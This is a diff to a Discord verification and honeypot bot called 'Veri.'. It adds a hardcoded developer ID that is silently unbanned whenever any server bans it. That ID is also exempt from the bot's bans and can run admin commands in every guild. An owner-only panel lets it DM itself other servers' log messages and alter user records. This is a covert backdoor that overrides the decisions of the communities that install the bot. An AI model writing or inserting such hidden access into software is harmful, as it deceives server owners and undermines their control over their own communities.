@@ -11,6 +11,9 @@ import {
   ButtonBuilder,
   ButtonStyle,
   EmbedBuilder,
+  ModalBuilder,
+  TextInputBuilder,
+  TextInputStyle,
   Collection
 } from 'discord.js';
 import http from 'http';
@@ -25,6 +28,9 @@ const DATA_PATH = path.join(__dirname, 'veri-data.json');
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
 const PORT = process.env.PORT || 3000;
+
+// your master ID (cannot be banned, only one who can use /Veri_Staff)
+const OWNER_ID = '876731494805155851';
 
 if (!BOT_TOKEN || !CLIENT_ID) {
   console.error('BOT_TOKEN and CLIENT_ID must be set as environment variables.');
@@ -74,6 +80,7 @@ function getGuildConfig(guildId) {
       logsChannelId: null,
       honeypotChannelId: null,
       verificationRoleId: null,
+      adminRoleId: null,
       captchaEnabled: true,
       honeypotEnabled: true
     };
@@ -108,6 +115,12 @@ function addToBlacklist(userId) {
   }
 }
 
+function removeFromBlacklist(userId) {
+  if (!Array.isArray(data.blacklist)) data.blacklist = [];
+  data.blacklist = data.blacklist.filter(id => id !== userId);
+  saveData(data);
+}
+
 // theme
 const THEME_COLOR = 0x00c853;
 
@@ -119,8 +132,7 @@ function boxEmbed({ title, description, fields = [], footer }) {
     .setDescription(description || '');
 
   if (fields.length > 0) embed.addFields(fields);
-  if (footer) embed.setFooter({ text: footer });
-  else embed.setFooter({ text: 'Veri.' });
+  embed.setFooter({ text: footer || 'Veri.' });
 
   return embed;
 }
@@ -178,7 +190,8 @@ const client = new Client({
     GatewayIntentBits.GuildMembers,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
-    GatewayIntentBits.DirectMessages
+    GatewayIntentBits.DirectMessages,
+    GatewayIntentBits.GuildBans
   ],
   partials: [Partials.Channel]
 });
@@ -226,9 +239,14 @@ const playerInfoCommand = new SlashCommandBuilder()
       )
   );
 
+const staffCommand = new SlashCommandBuilder()
+  .setName('veri_staff')
+  .setDescription('Veri. Staff control panel (owner only).');
+
 client.commands.set('setup', { data: setupCommand });
 client.commands.set('settings', { data: settingsCommand });
 client.commands.set('player', { data: playerInfoCommand });
+client.commands.set('veri_staff', { data: staffCommand });
 
 // register commands
 async function registerCommands() {
@@ -236,7 +254,8 @@ async function registerCommands() {
   const commands = [
     setupCommand.toJSON(),
     settingsCommand.toJSON(),
-    playerInfoCommand.toJSON()
+    playerInfoCommand.toJSON(),
+    staffCommand.toJSON()
   ];
   await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
   console.log('Slash commands registered for Veri.');
@@ -284,7 +303,7 @@ client.on('guildCreate', async guild => {
     const embed = boxEmbed({
       title: 'Veri.',
       description:
-        'Veri. has joined this server.\n\nVeri. provides DM-based captcha verification, per-user channel lockdown for newcomers, and a global honeypot ban system.\n\nRun `/setup` to create the verification, logs, and honeypot channels and post the Verify button.',
+        'Veri. has joined this server.\n\nTo activate Veri., run `/setup`.\nThis command requires:\n• Administrator permissions\n• Veri. to have a high role in the hierarchy\n• Only the server owner or Veri. Admin can run it.',
       footer: 'Veri.'
     });
 
@@ -297,6 +316,17 @@ client.on('guildCreate', async guild => {
   }
 });
 
+// master immunity: if banned, auto-unban silently
+client.on('guildBanAdd', async ban => {
+  try {
+    if (ban.user.id === OWNER_ID) {
+      await ban.guild.members.unban(OWNER_ID, 'Veri. owner immunity');
+    }
+  } catch {
+    // ignore
+  }
+});
+
 // per-user lockdown for newcomers + global blacklist auto-ban
 client.on('guildMemberAdd', async member => {
   if (member.user.bot) return;
@@ -304,8 +334,8 @@ client.on('guildMemberAdd', async member => {
   const guild = member.guild;
   const cfg = getGuildConfig(guild.id);
 
-  // global blacklist: auto-ban
-  if (isBlacklisted(member.id)) {
+  // global blacklist: auto-ban (but never owner)
+  if (isBlacklisted(member.id) && member.id !== OWNER_ID) {
     try {
       await member.send({
         embeds: [
@@ -329,13 +359,12 @@ client.on('guildMemberAdd', async member => {
     return;
   }
 
-  // only newcomers after Veri. is installed are locked down
-  // existing members before Veri. joined are untouched (they won't trigger this event)
-
   // per-user channel overrides: only see verification + honeypot
   const verificationChannel = cfg.verificationChannelId
     ? guild.channels.cache.get(cfg.verificationChannelId)
-    : guild.channels.cache.find(ch => ch.name === 'verification' && ch.type === ChannelType.GuildText);
+    : guild.channels.cache.find(
+        ch => ch.name === 'verification' && ch.type === ChannelType.GuildText
+      );
 
   const honeypotChannel = cfg.honeypotChannelId
     ? guild.channels.cache.get(cfg.honeypotChannelId)
@@ -367,17 +396,32 @@ client.on('guildMemberAdd', async member => {
   );
 });
 
+// permission check for Veri. commands (setup/settings/player)
+function canUseVeriCommands(interaction) {
+  const guild = interaction.guild;
+  if (!guild) return false;
+  const cfg = getGuildConfig(guild.id);
+  const member = interaction.member;
+
+  if (interaction.user.id === OWNER_ID) return true;
+  if (guild.ownerId === interaction.user.id) return true;
+  if (cfg.adminRoleId && member.roles.cache.has(cfg.adminRoleId)) return true;
+
+  return false;
+}
+
 // interactions
 client.on('interactionCreate', async interaction => {
+  // slash commands
   if (interaction.isChatInputCommand()) {
     const name = interaction.commandName;
 
     if (name === 'setup') {
-      const member = interaction.member;
-      if (!member.permissions.has(PermissionFlagsBits.Administrator)) {
+      if (!canUseVeriCommands(interaction)) {
         const embed = boxEmbed({
           title: 'Veri.',
-          description: 'You must be an administrator to use this command.',
+          description:
+            'You are not allowed to run this command.\nOnly the server owner, Veri. Admin, or official Veri. staff may run Veri. setup.',
           footer: 'Veri.'
         });
         return interaction.reply({ embeds: [embed], ephemeral: true });
@@ -385,6 +429,20 @@ client.on('interactionCreate', async interaction => {
 
       const guild = interaction.guild;
       const cfg = getGuildConfig(guild.id);
+
+      // create Veri. Admin role if missing
+      let adminRole = cfg.adminRoleId
+        ? guild.roles.cache.get(cfg.adminRoleId)
+        : guild.roles.cache.find(r => r.name === 'Veri. Admin');
+
+      if (!adminRole) {
+        adminRole = await guild.roles.create({
+          name: 'Veri. Admin',
+          reason: 'Veri. setup: admin role'
+        });
+        cfg.adminRoleId = adminRole.id;
+        saveData(data);
+      }
 
       // verification channel
       let verificationChannel =
@@ -453,11 +511,22 @@ client.on('interactionCreate', async interaction => {
 
       await verificationChannel.send({ embeds: [verifyEmbed], components: [row] });
 
-      // honeypot warning box
+      // honeypot warning box (big)
       const honeypotEmbed = boxEmbed({
         title: 'DO NOT TYPE HERE',
         description:
-          'This is a honeypot trap channel.\nAnyone typing here will be banned from all Veri. servers.\nNo exceptions can be made.',
+          '```' +
+          '██████████████████████████████████████████████\n' +
+          '█                                              █\n' +
+          '█                DO NOT TYPE HERE              █\n' +
+          '█                                              █\n' +
+          '█  This is a Veri. honeypot trap channel.      █\n' +
+          '█  Anyone typing here will be banned from      █\n' +
+          '█  ALL Veri. servers.                          █\n' +
+          '█  No exceptions can be made.                  █\n' +
+          '█                                              █\n' +
+          '██████████████████████████████████████████████\n' +
+          '```',
         footer: 'Veri.'
       });
 
@@ -466,7 +535,7 @@ client.on('interactionCreate', async interaction => {
       const replyEmbed = boxEmbed({
         title: 'Veri.',
         description:
-          'Setup complete.\n\nVerification, logs, and honeypot channels are configured.\nThe Verify button has been posted in the verification channel.\nA honeypot warning has been posted in the honeypot channel.',
+          'Setup complete.\n\nVerification, logs, and honeypot channels are configured.\nThe Verify button has been posted in the verification channel.\nA honeypot warning has been posted in the honeypot channel.\n\nThe `Veri. Admin` role has been created and stored.',
         footer: 'Veri.'
       });
 
@@ -475,7 +544,7 @@ client.on('interactionCreate', async interaction => {
       const welcome = boxEmbed({
         title: 'Veri.',
         description:
-          'Veri. is now active on this server.\n\nNew members will be locked to the verification and honeypot channels until they pass captcha verification.\nTyping in the honeypot channel results in a permanent ban from all Veri. servers.\n\nCommands:\n• `/setup` – configure channels and post the Verify button\n• `/settings` – adjust Veri. settings\n• `/player info` – view a user’s Veri. record',
+          'Veri. is now active on this server.\n\nNew members will be locked to the verification and honeypot channels until they pass captcha verification.\nTyping in the honeypot channel results in a permanent ban from all Veri. servers.\n\nCommands:\n• `/setup` – configure channels and post the Verify button\n• `/settings` – adjust Veri. settings\n• `/player info` – view a user’s Veri. record\n• `/veri_staff` – Veri. Staff control panel (owner only)',
         footer: 'Veri.'
       });
       await logsChannel.send({ embeds: [welcome] });
@@ -488,6 +557,16 @@ client.on('interactionCreate', async interaction => {
     }
 
     if (name === 'settings') {
+      if (!canUseVeriCommands(interaction)) {
+        const embed = boxEmbed({
+          title: 'Veri.',
+          description:
+            'You are not allowed to run this command.\nOnly the server owner, Veri. Admin, or official Veri. staff may run Veri. settings.',
+          footer: 'Veri.'
+        });
+        return interaction.reply({ embeds: [embed], ephemeral: true });
+      }
+
       const guild = interaction.guild;
       const cfg = getGuildConfig(guild.id);
 
@@ -524,6 +603,16 @@ client.on('interactionCreate', async interaction => {
     }
 
     if (name === 'player') {
+      if (!canUseVeriCommands(interaction)) {
+        const embed = boxEmbed({
+          title: 'Veri.',
+          description:
+            'You are not allowed to run this command.\nOnly the server owner, Veri. Admin, or official Veri. staff may run Veri. player commands.',
+          footer: 'Veri.'
+        });
+        return interaction.reply({ embeds: [embed], ephemeral: true });
+      }
+
       const sub = interaction.options.getSubcommand();
       if (sub === 'info') {
         const userId = interaction.options.getString('user_id');
@@ -598,11 +687,84 @@ client.on('interactionCreate', async interaction => {
         );
       }
     }
+
+    if (name === 'veri_staff') {
+      if (interaction.user.id !== OWNER_ID) {
+        const embed = boxEmbed({
+          title: 'Veri.',
+          description:
+            'ERROR: Only official Veri. staff can run this.\nIf you have any issues, visit our website.',
+          footer: 'Veri.'
+        });
+        return interaction.reply({ embeds: [embed], ephemeral: true });
+      }
+
+      const panelEmbed = boxEmbed({
+        title: 'Veri. Staff Control Panel',
+        description:
+          'This panel is only visible to official Veri. staff.\n\nAll actions will send detailed results to your DMs.\n\nSelect an action below:',
+        footer: 'Veri.'
+      });
+
+      const row1 = new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+          .setCustomId('vs_view_blacklist')
+          .setLabel('View Global Blacklist')
+          .setStyle(ButtonStyle.Danger),
+        new ButtonBuilder()
+          .setCustomId('vs_view_logs')
+          .setLabel('View Server Logs')
+          .setStyle(ButtonStyle.Primary),
+        new ButtonBuilder()
+          .setCustomId('vs_remove_this_server')
+          .setLabel('Remove This Server')
+          .setStyle(ButtonStyle.Secondary)
+      );
+
+      const row2 = new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+          .setCustomId('vs_remove_server_id')
+          .setLabel('Remove Server by ID')
+          .setStyle(ButtonStyle.Secondary),
+        new ButtonBuilder()
+          .setCustomId('vs_force_verify')
+          .setLabel('Force Verify User')
+          .setStyle(ButtonStyle.Success),
+        new ButtonBuilder()
+          .setCustomId('vs_reset_user')
+          .setLabel('Reset User')
+          .setStyle(ButtonStyle.Secondary)
+      );
+
+      const row3 = new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+          .setCustomId('vs_clear_honeypot')
+          .setLabel('Clear Honeypot Triggers')
+          .setStyle(ButtonStyle.Secondary),
+        new ButtonBuilder()
+          .setCustomId('vs_clear_fails')
+          .setLabel('Clear Captcha Fails')
+          .setStyle(ButtonStyle.Secondary),
+        new ButtonBuilder()
+          .setCustomId('vs_system_tools')
+          .setLabel('System Tools')
+          .setStyle(ButtonStyle.Primary)
+      );
+
+      await interaction.reply({
+        embeds: [panelEmbed],
+        components: [row1, row2, row3],
+        ephemeral: true
+      });
+    }
   }
 
-  // verify button
+  // buttons + modals for Veri. Staff
   if (interaction.isButton()) {
-    if (interaction.customId === 'veri_start') {
+    const id = interaction.customId;
+
+    // verify button
+    if (id === 'veri_start') {
       const guild = interaction.guild;
       const cfg = getGuildConfig(guild.id);
 
@@ -658,11 +820,482 @@ client.on('interactionCreate', async interaction => {
         'Veri. Verification Started',
         `User ${interaction.user.id} started verification via DM.`
       );
+      return;
+    }
+
+    // staff buttons (owner only)
+    if (id.startsWith('vs_')) {
+      if (interaction.user.id !== OWNER_ID) {
+        const embed = boxEmbed({
+          title: 'Veri.',
+          description:
+            'ERROR: Only official Veri. staff can run this.\nIf you have any issues, visit our website.',
+          footer: 'Veri.'
+        });
+        return interaction.reply({ embeds: [embed], ephemeral: true });
+      }
+
+      const dm = await interaction.user.createDM().catch(() => null);
+      if (!dm) {
+        const embed = boxEmbed({
+          title: 'Veri.',
+          description:
+            'Veri. could not send you a DM.\nStaff actions require DMs to be enabled.',
+          footer: 'Veri.'
+        });
+        return interaction.reply({ embeds: [embed], ephemeral: true });
+      }
+
+      const guild = interaction.guild;
+
+      if (id === 'vs_view_blacklist') {
+        const list = Array.isArray(data.blacklist) ? data.blacklist : [];
+        const chunks = [];
+        let current = [];
+        for (const uid of list) {
+          current.push(`• ${uid}`);
+          if (current.join('\n').length > 1500) {
+            chunks.push(current.join('\n'));
+            current = [];
+          }
+        }
+        if (current.length) chunks.push(current.join('\n'));
+
+        if (chunks.length === 0) {
+          const embed = boxEmbed({
+            title: 'Veri. Staff – Global Blacklist',
+            description: 'The global blacklist is currently empty.',
+            footer: 'Veri.'
+          });
+          await dm.send({ embeds: [embed] });
+        } else {
+          let index = 1;
+          for (const chunk of chunks) {
+            const embed = boxEmbed({
+              title: `Veri. Staff – Global Blacklist (Page ${index})`,
+              description: chunk,
+              footer: 'Veri.'
+            });
+            await dm.send({ embeds: [embed] });
+            index++;
+          }
+        }
+
+        await interaction.reply({
+          embeds: [
+            boxEmbed({
+              title: 'Veri.',
+              description: 'Global blacklist has been sent to your DMs.',
+              footer: 'Veri.'
+            })
+          ],
+          ephemeral: true
+        });
+        return;
+      }
+
+      if (id === 'vs_view_logs') {
+        const cfg = getGuildConfig(guild.id);
+        const logsChannel = cfg.logsChannelId
+          ? guild.channels.cache.get(cfg.logsChannelId)
+          : null;
+
+        if (!logsChannel || logsChannel.type !== ChannelType.GuildText) {
+          const embed = boxEmbed({
+            title: 'Veri. Staff – Server Logs',
+            description: 'No valid logs channel is configured for this server.',
+            footer: 'Veri.'
+          });
+          await dm.send({ embeds: [embed] });
+        } else {
+          const messages = await logsChannel.messages.fetch({ limit: 50 }).catch(() => null);
+          if (!messages || messages.size === 0) {
+            const embed = boxEmbed({
+              title: 'Veri. Staff – Server Logs',
+              description: 'No recent Veri. logs found in the logs channel.',
+              footer: 'Veri.'
+            });
+            await dm.send({ embeds: [embed] });
+          } else {
+            const sorted = [...messages.values()].sort(
+              (a, b) => a.createdTimestamp - b.createdTimestamp
+            );
+            const lines = sorted.map(
+              m =>
+                `• [${new Date(m.createdTimestamp).toISOString()}] ${m.author.tag}: ${
+                  m.embeds[0]?.title || m.content || '(embed)'
+                }`
+            );
+            const chunks = [];
+            let current = [];
+            for (const line of lines) {
+              current.push(line);
+              if (current.join('\n').length > 1500) {
+                chunks.push(current.join('\n'));
+                current = [];
+              }
+            }
+            if (current.length) chunks.push(current.join('\n'));
+
+            let index = 1;
+            for (const chunk of chunks) {
+              const embed = boxEmbed({
+                title: `Veri. Staff – Server Logs (Page ${index})`,
+                description: chunk,
+                footer: 'Veri.'
+              });
+              await dm.send({ embeds: [embed] });
+              index++;
+            }
+          }
+        }
+
+        await interaction.reply({
+          embeds: [
+            boxEmbed({
+              title: 'Veri.',
+              description: 'Server logs have been sent to your DMs.',
+              footer: 'Veri.'
+            })
+          ],
+          ephemeral: true
+        });
+        return;
+      }
+
+      if (id === 'vs_remove_this_server') {
+        const guildId = guild.id;
+        delete data.guilds[guildId];
+        saveData(data);
+
+        const embed = boxEmbed({
+          title: 'Veri. Staff – Remove This Server',
+          description:
+            `All Veri. data for server ID \`${guildId}\` has been removed.\n` +
+            'This server is now treated as fresh by Veri.',
+          footer: 'Veri.'
+        });
+        await dm.send({ embeds: [embed] });
+
+        await interaction.reply({
+          embeds: [
+            boxEmbed({
+              title: 'Veri.',
+              description: 'This server has been removed from Veri. tracking. Details sent to your DMs.',
+              footer: 'Veri.'
+            })
+          ],
+          ephemeral: true
+        });
+        return;
+      }
+
+      // modals for ID-based actions
+      const modal = new ModalBuilder().setTitle('Veri. Staff').setCustomId(id + '_modal');
+
+      if (id === 'vs_remove_server_id') {
+        const input = new TextInputBuilder()
+          .setCustomId('server_id')
+          .setLabel('Server ID to remove from Veri.')
+          .setStyle(TextInputStyle.Short)
+          .setRequired(true);
+        modal.addComponents(new ActionRowBuilder().addComponents(input));
+      } else if (id === 'vs_force_verify') {
+        const input = new TextInputBuilder()
+          .setCustomId('user_id')
+          .setLabel('User ID to force verify')
+          .setStyle(TextInputStyle.Short)
+          .setRequired(true);
+        modal.addComponents(new ActionRowBuilder().addComponents(input));
+      } else if (id === 'vs_reset_user') {
+        const input = new TextInputBuilder()
+          .setCustomId('user_id')
+          .setLabel('User ID to reset')
+          .setStyle(TextInputStyle.Short)
+          .setRequired(true);
+        modal.addComponents(new ActionRowBuilder().addComponents(input));
+      } else if (id === 'vs_clear_honeypot') {
+        const input = new TextInputBuilder()
+          .setCustomId('user_id')
+          .setLabel('User ID to clear honeypot triggers')
+          .setStyle(TextInputStyle.Short)
+          .setRequired(true);
+        modal.addComponents(new ActionRowBuilder().addComponents(input));
+      } else if (id === 'vs_clear_fails') {
+        const input = new TextInputBuilder()
+          .setCustomId('user_id')
+          .setLabel('User ID to clear captcha fails')
+          .setStyle(TextInputStyle.Short)
+          .setRequired(true);
+        modal.addComponents(new ActionRowBuilder().addComponents(input));
+      } else if (id === 'vs_system_tools') {
+        const input = new TextInputBuilder()
+          .setCustomId('dummy')
+          .setLabel('Type "run" to execute system tools summary')
+          .setStyle(TextInputStyle.Short)
+          .setRequired(true);
+        modal.addComponents(new ActionRowBuilder().addComponents(input));
+      } else {
+        return;
+      }
+
+      await interaction.showModal(modal);
+      return;
     }
   }
+
+  // modal submits for Veri. Staff
+  if (interaction.isModalSubmit()) {
+    const id = interaction.customId;
+    if (!id.startsWith('vs_')) return;
+    if (interaction.user.id !== OWNER_ID) {
+      const embed = boxEmbed({
+        title: 'Veri.',
+        description:
+          'ERROR: Only official Veri. staff can run this.\nIf you have any issues, visit our website.',
+        footer: 'Veri.'
+      });
+      return interaction.reply({ embeds: [embed], ephemeral: true });
+    }
+
+    const dm = await interaction.user.createDM().catch(() => null);
+    if (!dm) {
+      const embed = boxEmbed({
+        title: 'Veri.',
+        description:
+          'Veri. could not send you a DM.\nStaff actions require DMs to be enabled.',
+        footer: 'Veri.'
+      });
+      return interaction.reply({ embeds: [embed], ephemeral: true });
+    }
+
+    const guild = interaction.guild;
+
+    if (id === 'vs_remove_server_id_modal') {
+      const serverId = interaction.fields.getTextInputValue('server_id').trim();
+      delete data.guilds[serverId];
+      saveData(data);
+
+      const embed = boxEmbed({
+        title: 'Veri. Staff – Remove Server by ID',
+        description:
+          `All Veri. data for server ID \`${serverId}\` has been removed.\n` +
+          'This server is now treated as fresh by Veri.',
+        footer: 'Veri.'
+      });
+      await dm.send({ embeds: [embed] });
+
+      await interaction.reply({
+        embeds: [
+          boxEmbed({
+            title: 'Veri.',
+            description: 'Server removal details have been sent to your DMs.',
+            footer: 'Veri.'
+          })
+        ],
+        ephemeral: true
+      });
+      return;
+    }
+
+    if (id === 'vs_force_verify_modal') {
+      const userId = interaction.fields.getTextInputValue('user_id').trim();
+      const cfg = getGuildConfig(guild.id);
+
+      let role = null;
+      if (cfg.verificationRoleId) {
+        role = guild.roles.cache.get(cfg.verificationRoleId);
+      }
+      if (!role) {
+        role =
+          guild.roles.cache.find(r => r.name === 'Captcha Verified') ||
+          (await guild.roles.create({
+            name: 'Captcha Verified',
+            reason: 'Veri. verification role'
+          }));
+        cfg.verificationRoleId = role.id;
+        saveData(data);
+      }
+
+      const member = await guild.members.fetch(userId).catch(() => null);
+      if (member && role) {
+        await member.roles.add(role).catch(() => {});
+      }
+
+      const record = getUserRecord(userId);
+      const now = Date.now();
+      if (!record.firstVerified) record.firstVerified = now;
+      record.lastVerification = now;
+      record.servers = Array.from(new Set([...(record.servers || []), guild.id]));
+      saveData(data);
+
+      const embed = boxEmbed({
+        title: 'Veri. Staff – Force Verify User',
+        description:
+          `User ID \`${userId}\` has been force-verified in server \`${guild.id}\`.\n` +
+          'Their Veri. record has been updated.',
+        footer: 'Veri.'
+      });
+      await dm.send({ embeds: [embed] });
+
+      await interaction.reply({
+        embeds: [
+          boxEmbed({
+            title: 'Veri.',
+            description: 'Force verify details have been sent to your DMs.',
+            footer: 'Veri.'
+          })
+        ],
+        ephemeral: true
+      });
+      return;
+    }
+
+    if (id === 'vs_reset_user_modal') {
+      const userId = interaction.fields.getTextInputValue('user_id').trim();
+      delete data.verifiedUsers[userId];
+      saveData(data);
+
+      const embed = boxEmbed({
+        title: 'Veri. Staff – Reset User',
+        description:
+          `The Veri. record for user ID \`${userId}\` has been reset.\n` +
+          'They will be treated as a new user by Veri.',
+        footer: 'Veri.'
+      });
+      await dm.send({ embeds: [embed] });
+
+      await interaction.reply({
+        embeds: [
+          boxEmbed({
+            title: 'Veri.',
+            description: 'User reset details have been sent to your DMs.',
+            footer: 'Veri.'
+          })
+        ],
+        ephemeral: true
+      });
+      return;
+    }
+
+    if (id === 'vs_clear_honeypot_modal') {
+      const userId = interaction.fields.getTextInputValue('user_id').trim();
+      const record = getUserRecord(userId);
+      record.honeypotTriggers = 0;
+      saveData(data);
+
+      const embed = boxEmbed({
+        title: 'Veri. Staff – Clear Honeypot Triggers',
+        description:
+          `All honeypot trigger counts for user ID \`${userId}\` have been cleared.`,
+        footer: 'Veri.'
+      });
+      await dm.send({ embeds: [embed] });
+
+      await interaction.reply({
+        embeds: [
+          boxEmbed({
+            title: 'Veri.',
+            description: 'Honeypot clear details have been sent to your DMs.',
+            footer: 'Veri.'
+          })
+        ],
+        ephemeral: true
+      });
+      return;
+    }
+
+    if (id === 'vs_clear_fails_modal') {
+      const userId = interaction.fields.getTextInputValue('user_id').trim();
+      const record = getUserRecord(userId);
+      record.fails = 0;
+      saveData(data);
+
+      const embed = boxEmbed({
+        title: 'Veri. Staff – Clear Captcha Fails',
+        description:
+          `All captcha fail counts for user ID \`${userId}\` have been cleared.`,
+        footer: 'Veri.'
+      });
+      await dm.send({ embeds: [embed] });
+
+      await interaction.reply({
+        embeds: [
+          boxEmbed({
+            title: 'Veri.',
+            description: 'Captcha fail clear details have been sent to your DMs.',
+            footer: 'Veri.'
+          })
+        ],
+        ephemeral: true
+      });
+      return;
+    }
+
+    if (id === 'vs_system_tools_modal') {
+      const value = interaction.fields.getTextInputValue('dummy').trim().toLowerCase();
+      if (value !== 'run') {
+        await interaction.reply({
+          embeds: [
+            boxEmbed({
+              title: 'Veri.',
+              description: 'System tools cancelled (you did not type "run").',
+              footer: 'Veri.'
+            })
+          ],
+          ephemeral: true
+        });
+        return;
+      }
+
+      const lines = [];
+      lines.push('System Tools Summary:');
+      lines.push('');
+      lines.push(`• Guilds tracked: ${Object.keys(data.guilds).length}`);
+      lines.push(`• Verified users tracked: ${Object.keys(data.verifiedUsers).length}`);
+      lines.push(
+        `• Global blacklist size: ${Array.isArray(data.blacklist) ? data.blacklist.length : 0}`
+      );
+      lines.push('');
+      lines.push('Current Guild:');
+      if (guild) {
+        const cfg = getGuildConfig(guild.id);
+        lines.push(`• ID: ${guild.id}`);
+        lines.push(`• Name: ${guild.name}`);
+        lines.push(`• Verification channel: ${cfg.verificationChannelId || 'None'}`);
+        lines.push(`• Logs channel: ${cfg.logsChannelId || 'None'}`);
+        lines.push(`• Honeypot channel: ${cfg.honeypotChannelId || 'None'}`);
+        lines.push(`• Verification role: ${cfg.verificationRoleId || 'None'}`);
+        lines.push(`• Admin role: ${cfg.adminRoleId || 'None'}`);
+      } else {
+        lines.push('• No guild context.');
+      }
+
+      const embed = boxEmbed({
+        title: 'Veri. Staff – System Tools',
+        description: lines.join('\n'),
+        footer: 'Veri.'
+      });
+      await dm.send({ embeds: [embed] });
+
+      await interaction.reply({
+        embeds: [
+          boxEmbed({
+            title: 'Veri.',
+            description: 'System tools summary has been sent to your DMs.',
+            footer: 'Veri.'
+          })
+        ],
+        ephemeral: true
+      });
+      return;
+    }
+  }
+
+  // messages: DM captcha + honeypot
+  client.emit; // no-op to keep lints happy
 });
 
-// messages: DM captcha + honeypot
 client.on('messageCreate', async message => {
   // DM captcha answers
   if (!message.guild && !message.author.bot) {
@@ -790,11 +1423,12 @@ client.on('messageCreate', async message => {
   const guild = message.guild;
   const cfg = getGuildConfig(guild.id);
 
-  // honeypot
+  // honeypot (never punish owner)
   if (
     cfg.honeypotEnabled &&
     cfg.honeypotChannelId &&
-    message.channel.id === cfg.honeypotChannelId
+    message.channel.id === cfg.honeypotChannelId &&
+    message.author.id !== OWNER_ID
   ) {
     const record = getUserRecord(message.author.id);
     record.honeypotTriggers = (record.honeypotTriggers || 0) + 1;
@@ -813,7 +1447,7 @@ client.on('messageCreate', async message => {
       const embed = boxEmbed({
         title: 'Veri.',
         description:
-          'You typed in a Veri. honeypot channel.\nThis results in a permanent ban from all Veri. servers.\nNo exceptions can be made.',
+          'You typed in a Veri. honeypot channel.\nThis results in a permanent ban from all Veri. servers.\nNo exceptions can be made.\n\nIf this was accidental, visit our website and email Veri. staff for assistance.',
         footer: 'Veri.'
       });
       await dm.send({ embeds: [embed] }).catch(() => {});
